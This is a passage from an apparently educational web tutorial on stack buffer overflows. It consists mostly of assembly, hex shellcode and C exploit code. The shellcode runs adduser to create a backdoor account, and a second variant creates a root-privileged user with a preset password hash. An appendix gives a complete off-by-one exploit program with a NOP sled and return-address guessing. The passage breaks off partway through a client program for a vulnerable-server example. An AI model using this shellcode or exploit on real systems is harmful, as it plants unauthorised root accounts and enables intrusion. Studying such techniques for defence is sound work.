	<span class="nf">movb</span> <span class="kc">$</span><span class="mh">0xb</span><span class="p">,</span><span class="o">%</span><span class="nb">al</span>         <span class="err">#</span> <span class="nv">Code</span> <span class="nv">of</span> <span class="nv">SysCall</span><span class="o">-</span><span class="nv">table</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">esi</span><span class="p">,</span><span class="o">%</span><span class="nb">ebx</span>        <span class="err">#</span> <span class="nv">Address</span> <span class="nv">of</span> <span class="nv">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
	<span class="nf">leal</span> <span class="mi">63</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">),</span><span class="o">%</span><span class="nb">ecx</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="p">[</span><span class="nv">A</span><span class="p">]</span> <span class="nv">to</span> <span class="nb">ECX</span> <span class="p">(</span><span class="nv">name</span><span class="p">[])</span>
	<span class="nf">leal</span> <span class="mi">79</span><span class="p">(</span><span class="o">%</span><span class="nb">esi</span><span class="p">),</span><span class="o">%</span><span class="nb">edx</span>    <span class="err">#</span> <span class="nv">Address</span> <span class="nv">of</span> <span class="nv">null</span> <span class="nv">pointer</span> <span class="nv">to</span> <span class="nb">EDX</span>
	<span class="nf">int</span> <span class="kc">$</span><span class="mh">0x80</span>             <span class="err">#</span> <span class="nv">Trigger</span> <span class="nv">Interrupt</span>
	<span class="nf">xorl</span> <span class="o">%</span><span class="nb">ebx</span><span class="p">,</span><span class="o">%</span><span class="nb">ebx</span>	      <span class="err">#</span> <span class="nv">Begin</span> <span class="nv">of</span> <span class="nv">Error</span> <span class="nv">Handling</span>
	<span class="nf">movl</span> <span class="o">%</span><span class="nb">ebx</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
	<span class="nf">inc</span> <span class="o">%</span><span class="nb">eax</span>
	<span class="nf">int</span> <span class="kc">$</span><span class="mh">0x80</span>
<span class="nl">data:</span>
	<span class="nf">call</span> <span class="nv">start</span>            <span class="err">#</span> <span class="nv">Put</span> <span class="nv">base</span> <span class="nv">address</span> <span class="nv">of</span> <span class="nv">Strings</span> <span class="nv">on</span> <span class="nv">the</span> <span class="nv">Stack</span>
<span class="nf">.string</span> <span class="err">\"</span><span class="o">/</span><span class="nv">usr</span><span class="o">/</span><span class="nv">sbin</span><span class="o">/</span><span class="nv">adduser#markus#</span><span class="o">-</span><span class="nv">p#$1$7</span><span class="err">√è</span><span class="nv">v</span><span class="err">√ô</span><span class="nv">LK</span><span class="err">√è¬µ</span><span class="kc">$</span><span class="nb">gS</span><span class="nv">UKG6RALzRA8ryROcTsG0#</span><span class="err">\"</span></code></pre></figure> <p></p> <h2 id="assembling-the-program-and-extracting-the-machine-code">Assembling the program and extracting the machine code</h2> <p>After assembly, the machine code can be read out using the GDB debugger. This should be used next to create an exploit. The size of the code is exactly 128 bytes.</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
	<span class="s">"</span><span class="se">\xeb\x3a\x5e\x89\x76\x3f\x8d\x46</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x12\x89\x46\x43\x8d\x46\x19\x89</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x46\x47\x8d\x46\x1c\x89\x46\x4b</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x31\xc0\x88\x46\x11\x88\x46\x18</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x88\x46\x1b\x88\x46\x3e\x89\x46</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x4f\xb0\x0b\x89\xf3\x8d\x4e\x3f</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x8d\x56\x4f\xcd\x80\x31\xdb\x89</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\xd8\x40\xcd\x80\xe8\xc1\xff\xff</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\xff\x2f\x75\x73\x72\x2f\x73\x62</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x69\x6e\x2f\x61\x64\x64\x75\x73</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x65\x72\x23\x6d\x61\x72\x6b\x75</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x73\x23\x2d\x70\x23\x24\x31\x24</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x37\xcf\x76\xd9\x4c\x4b\xcf\xb5</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x24\x67\x53\x55\x4b\x47\x36\x52</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x41\x4c\x7a\x52\x41\x38\x72\x79</span><span class="s">"</span>
	<span class="s">"</span><span class="se">\x52\x4f\x63\x54\x73\x47\x30\x23</span><span class="s">"</span><span class="p">;</span></code></pre></figure> <p></p> <h2 id="creating-a-fully-functional-exploit">Creating a fully Functional Exploit</h2> <p>The goal of this exploit is to overflow the vulnerable program‚Äôs 512-byte buffer while making optimal use of the available space. Since our shellcode is only 128 bytes long, we have over 384 remaining bytes to occupy‚Äîan ideal scenario for implementing a <strong>NOP-sled</strong>. Additionally, we need to estimate the payload‚Äôs address so we can overwrite the function‚Äôs return address successfully.</p> <p>Given that the payload address is only a rough approximation, using a sufficiently large NOP region increases the likelihood of landing within that region and subsequently executing the shellcode. We will not discuss the C program that generates the exploit here, but you can find extensively documented source code on GitHub.</p> <p>Up to this point, our shellcode only creates a non-privileged user named <strong>markus</strong>. To create a <strong>root-privileged</strong> user, we would need an extended parameter list for the <code class="language-plaintext highlighter-rouge">useradd</code> program. The shellcode‚Äôs overall structure remains the same, so we will not delve into additional details; the code is simply listed below:</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="err">`</span><span class="n">main</span><span class="p">()</span><span class="err">`</span> <span class="p">{</span>
   <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">[</span><span class="mi">9</span><span class="p">];</span>
   <span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s">"/usr/sbin/adduser"</span><span class="p">;</span>
   <span class="n">name</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span><span class="s">"-u"</span><span class="p">;</span>
   <span class="n">name</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="s">"0"</span><span class="p">;</span>
   <span class="n">name</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="s">"-g"</span><span class="p">;</span>
   <span class="n">name</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="s">"root"</span><span class="p">;</span>
   <span class="n">name</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="s">"-p"</span>
   <span class="n">name</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="s">"$1$7√èv√ôLK√è¬µ$gSUKG6RALzRA8ryROcTsG0;</span><span class="err">
</span><span class="s">   name[7] = "</span><span class="n">rut</span><span class="s">";</span><span class="err">
</span><span class="s">   name[8] = NULL;</span><span class="err">
</span><span class="s">   execve(name[0], name, NULL);</span><span class="err">
</span><span class="s">}</span></code></pre></figure> <p> which leads to the following machine code:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">char</span> <span class="kt">byte</span><span class="nv">Code</span><span class="p">[]</span> <span class="err">=</span>
	<span class="err">"\</span><span class="nf">xeb</span><span class="err">\</span><span class="nv">x67</span><span class="err">\</span><span class="nv">x5e</span><span class="err">\</span><span class="nv">x89</span><span class="err">\</span><span class="nv">x76</span><span class="err">\</span><span class="nv">x4c</span><span class="err">\</span><span class="nv">x8d</span><span class="err">\</span><span class="nv">x46</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x12</span><span class="err">\</span><span class="nv">x89</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x50</span><span class="err">\</span><span class="nv">x8d</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x15</span><span class="err">\</span><span class="nv">x89</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x54</span><span class="err">\</span><span class="nv">x8d</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x17</span><span class="err">\</span><span class="nv">x89</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x58</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x8d</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x1a</span><span class="err">\</span><span class="nv">x89</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x5c</span><span class="err">\</span><span class="nv">x8d</span><span class="err">\</span><span class="nv">x46</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x1d</span><span class="err">\</span><span class="nv">x89</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x60</span><span class="err">\</span><span class="nv">x8d</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x22</span><span class="err">\</span><span class="nv">x89</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x64</span><span class="err">\</span><span class="nv">x8d</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x25</span><span class="err">\</span><span class="nv">x89</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x68</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x8d</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x48</span><span class="err">\</span><span class="nv">x89</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x6c</span><span class="err">\</span><span class="nv">x31</span><span class="err">\</span><span class="nv">xc0</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x88</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x11</span><span class="err">\</span><span class="nv">x88</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x14</span><span class="err">\</span><span class="nv">x88</span><span class="err">\</span><span class="nv">x46</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x16</span><span class="err">\</span><span class="nv">x88</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x19</span><span class="err">\</span><span class="nv">x88</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x1c</span><span class="err">\</span><span class="nv">x88</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x21</span><span class="err">\</span><span class="nv">x88</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x24</span><span class="err">\</span><span class="nv">x88</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x47</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x88</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x4b</span><span class="err">\</span><span class="nv">x89</span><span class="err">\</span><span class="nv">x46</span><span class="err">\</span><span class="nv">x70</span><span class="err">\</span><span class="nv">xb0</span><span class="err">\</span><span class="nv">x0b</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x89</span><span class="err">\</span><span class="nv">xf3</span><span class="err">\</span><span class="nv">x8d</span><span class="err">\</span><span class="nv">x4e</span><span class="err">\</span><span class="nv">x4c</span><span class="err">\</span><span class="nv">x8d</span><span class="err">\</span><span class="nv">x56</span><span class="err">\</span><span class="nv">x70</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">xcd</span><span class="err">\</span><span class="nv">x80</span><span class="err">\</span><span class="nv">x31</span><span class="err">\</span><span class="nv">xdb</span><span class="err">\</span><span class="nv">x89</span><span class="err">\</span><span class="nv">xd8</span><span class="err">\</span><span class="nv">x40</span><span class="err">\</span><span class="nv">xcd</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x80</span><span class="err">\</span><span class="nv">xe8</span><span class="err">\</span><span class="nv">x94</span><span class="err">\</span><span class="nv">xff</span><span class="err">\</span><span class="nv">xff</span><span class="err">\</span><span class="nv">xff</span><span class="err">\</span><span class="nv">x2f</span><span class="err">\</span><span class="nv">x75</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x73</span><span class="err">\</span><span class="nv">x72</span><span class="err">\</span><span class="nv">x2f</span><span class="err">\</span><span class="nv">x73</span><span class="err">\</span><span class="nv">x62</span><span class="err">\</span><span class="nv">x69</span><span class="err">\</span><span class="nv">x6e</span><span class="err">\</span><span class="nv">x2f</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x61</span><span class="err">\</span><span class="nv">x64</span><span class="err">\</span><span class="nv">x64</span><span class="err">\</span><span class="nv">x75</span><span class="err">\</span><span class="nv">x73</span><span class="err">\</span><span class="nv">x65</span><span class="err">\</span><span class="nv">x72</span><span class="err">\</span><span class="nv">x23</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x2d</span><span class="err">\</span><span class="nv">x75</span><span class="err">\</span><span class="nv">x23</span><span class="err">\</span><span class="nv">x30</span><span class="err">\</span><span class="nv">x23</span><span class="err">\</span><span class="nv">x2d</span><span class="err">\</span><span class="nv">x6f</span><span class="err">\</span><span class="nv">x23</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x2d</span><span class="err">\</span><span class="nv">x67</span><span class="err">\</span><span class="nv">x23</span><span class="err">\</span><span class="nv">x72</span><span class="err">\</span><span class="nv">x6f</span><span class="err">\</span><span class="nv">x6f</span><span class="err">\</span><span class="nv">x74</span><span class="err">\</span><span class="nv">x23</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x2d</span><span class="err">\</span><span class="nv">x70</span><span class="err">\</span><span class="nv">x23</span><span class="err">\</span><span class="nv">x24</span><span class="err">\</span><span class="nv">x31</span><span class="err">\</span><span class="nv">x24</span><span class="err">\</span><span class="nv">x37</span><span class="err">\</span><span class="nv">xcf</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x76</span><span class="err">\</span><span class="nv">xd9</span><span class="err">\</span><span class="nv">x4c</span><span class="err">\</span><span class="nv">x4b</span><span class="err">\</span><span class="nv">xcf</span><span class="err">\</span><span class="nv">xb5</span><span class="err">\</span><span class="nv">x24</span><span class="err">\</span><span class="nv">x67</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x53</span><span class="err">\</span><span class="nv">x55</span><span class="err">\</span><span class="nv">x4b</span><span class="err">\</span><span class="nv">x47</span><span class="err">\</span><span class="nv">x36</span><span class="err">\</span><span class="nv">x52</span><span class="err">\</span><span class="nv">x41</span><span class="err">\</span><span class="nv">x4c</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x7a</span><span class="err">\</span><span class="nv">x52</span><span class="err">\</span><span class="nv">x41</span><span class="err">\</span><span class="nv">x38</span><span class="err">\</span><span class="nv">x72</span><span class="err">\</span><span class="nv">x79</span><span class="err">\</span><span class="nv">x52</span><span class="err">\</span><span class="nv">x4f</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x63</span><span class="err">\</span><span class="nv">x54</span><span class="err">\</span><span class="nv">x73</span><span class="err">\</span><span class="nv">x47</span><span class="err">\</span><span class="nv">x30</span><span class="err">\</span><span class="nv">x23</span><span class="err">\</span><span class="nv">x72</span><span class="err">\</span><span class="nv">x75</span><span class="s">"
	"</span><span class="err">\</span><span class="nv">x74</span><span class="err">\</span><span class="nv">x23</span><span class="err">"</span><span class="c1">;</span></code></pre></figure> <p></p> <h1 id="appendix">Appendix</h1> <h2 id="example-for-off-by-ones-overflows">Example for Off-By-Ones Overflows</h2> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/errno.h&gt;</span><span class="cp">
</span>
<span class="cp">#define DEFAULT_OFFSET  500 - 32
#define DEFAULT_BUFFER  521
#define NOP             0x90
</span>
<span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
    <span class="s">"</span><span class="se">\xeb\x3a\x5e\x89\x76\x3f\x8d\x46</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x12\x89\x46\x43\x8d\x46\x19\x89</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x46\x47\x8d\x46\x1c\x89\x46\x4b</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x31\xc0\x88\x46\x11\x88\x46\x18</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x88\x46\x1b\x88\x46\x3e\x89\x46</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x4f\xb0\x0b\x89\xf3\x8d\x4e\x3f</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x8d\x56\x4f\xcd\x80\x31\xdb\x89</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xd8\x40\xcd\x80\xe8\xc1\xff\xff</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xff\x2f\x75\x73\x72\x2f\x73\x62</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x69\x6e\x2f\x61\x64\x64\x75\x73</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x65\x72\x23\x6d\x61\x72\x6b\x75</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x73\x23\x2d\x70\x23\x24\x31\x24</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x37\xcf\x76\xd9\x4c\x4b\xcf\xb5</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x24\x67\x53\x55\x4b\x47\x36\x52</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x41\x4c\x7a\x52\x41\x38\x72\x79</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x52\x4f\x63\x54\x73\x47\x30\x23</span><span class="s">"</span><span class="p">;</span>

<span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">getESP</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">__asm__</span><span class="p">(</span><span class="s">"movl %esp,%eax"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">calc</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">bb</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
    <span class="c1">// Because too much memory is allocated (GCC bug),</span>
    <span class="c1">// let the loop run a bit further. Even so, only</span>
    <span class="c1">// the lower byte of the saved frame pointer (SFP) is overwritten!!!</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">520</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="n">bb</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">str</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>

    <span class="n">bb</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">bb</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">calctmp</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// The call does not happen directly from main,</span>
    <span class="c1">// but via an intermediate function. Why???</span>
    <span class="c1">// The SFP in main is too large and therefore cannot be reached.</span>
    <span class="c1">// Check whether this might be related to argc, argv, and envp.</span>
    <span class="c1">// char arr[33];</span>
    <span class="n">calc</span><span class="p">(</span><span class="n">str</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="c1">// char dummy[1];</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">buff</span><span class="p">,</span> <span class="o">*</span><span class="n">tmp</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">DEFAULT_OFFSET</span><span class="p">,</span> <span class="n">buffs</span> <span class="o">=</span> <span class="n">DEFAULT_BUFFER</span><span class="p">,</span> <span class="n">i</span><span class="p">;</span>
    <span class="kt">long</span> <span class="n">adr</span><span class="p">,</span> <span class="o">*</span><span class="n">adr_pointer</span><span class="p">;</span>

    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>
        <span class="n">offset</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>

    <span class="n">buff</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">buffs</span><span class="p">);</span>    <span class="c1">// Reserve memory on the heap</span>

    <span class="n">adr</span> <span class="o">=</span> <span class="n">getESP</span><span class="p">()</span> <span class="o">-</span> <span class="n">offset</span><span class="p">;</span>
    <span class="n">tmp</span> <span class="o">=</span> <span class="n">buff</span><span class="p">;</span>
    <span class="n">adr_pointer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span><span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">tmp</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>  <span class="c1">// +1 because the stack is set up incorrectly</span>

    <span class="c1">// Fill the entire buffer with the suspected address</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">buffs</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">)</span>
        <span class="o">*</span><span class="p">(</span><span class="n">adr_pointer</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">adr</span><span class="p">;</span>

    <span class="c1">// Fill the first half with NOPs</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">buffs</span><span class="o">/</span><span class="mi">2</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="n">buff</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">NOP</span><span class="p">;</span>

    <span class="n">tmp</span> <span class="o">=</span> <span class="n">buff</span> <span class="o">+</span> <span class="p">((</span><span class="n">buffs</span><span class="o">/</span><span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">));</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="o">*</span><span class="p">(</span><span class="n">tmp</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>

    <span class="n">buff</span><span class="p">[</span><span class="n">buffs</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="c1">// Off-by-one byte</span>

    <span class="n">calctmp</span><span class="p">(</span><span class="n">buff</span><span class="p">);</span>

    <span class="cm">/*
    printf("%s", buff);
    fflush(stdout);
    */</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure> <h2 id="example-for-a-server-with-a-buffer-overflow-vulnerability">Example for a Server with a Buffer Overflow Vulnerability</h2> <h3 id="clientc">client.c</h3> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;netinet/in.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;netdb.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;arpa/inet.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>

<span class="cp">#define PORT 7777
#define BUF_SIZE 1024
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
	<span class="kt">int</span> <span class="n">sock</span><span class="p">,</span> <span class="n">run</span><span class="p">,</span> <span class="n">r</span><span class="p">;</span>
	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">BUF_SIZE</span><span class="p">];</span>
	<span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">server</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">hostent</span> <span class="o">*</span><span class="n">hp</span><span class="p">;</span>
	<span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"usage: client &lt;hostname&gt; </span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="cm">/* create socket */</span>
	<span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">SOCK_STREAM</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">sock</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">"open stream socket"</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">server</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>

	<span class="cm">/* get internet address of host specified by command line */</span>
	<span class="n">hp</span> <span class="o">=</span> <span class="n">gethostbyname</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
	<span class="k">if</span><span class="p">(</span><span class="n">hp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span><span class="s">"%s unknown host.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="cm">/* copies the internet address to server address */</span>
	<span class="n">bcopy</span><span class="p">(</span><span class="n">hp</span><span class="o">-&gt;</span><span class="n">h_addr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">server</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">,</span> <span class="n">hp</span><span class="o">-&gt;</span><span class="n">h_length</span><span class="p">);</span>

	<span class="cm">/* set port */</span>
	<span class="n">server</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span>

	<span class="cm">/* open connection */</span>
	<span class="k">if</span><span class="p">(</span><span class="n">connect</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="o">&amp;</span><span class="n">server</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">perror</span><span class="p">(</span><span class="s">"connecting stream socket"</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="cm">/* read input from stdin */</span>
	<span class="k">while</span><span class="p">(</span><span class="n">run</span><span class="o">=</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="n">BUF_SIZE</span><span class="p">))</span>
	<span class="p">{</span>
		<span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"%s"</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
		<span class="k">if</span><span class="p">(</span><span class="n">run</span><span class="o">&lt;</span><span class="mi">0</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="n">perror</span><span class="p">(</span><span class="s">"error reading from stdin"</span><span class="p">);</span>
			<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
		<span class="p">}</span>
		
		<span class="cm">/* write buffer to stream socket */</span>
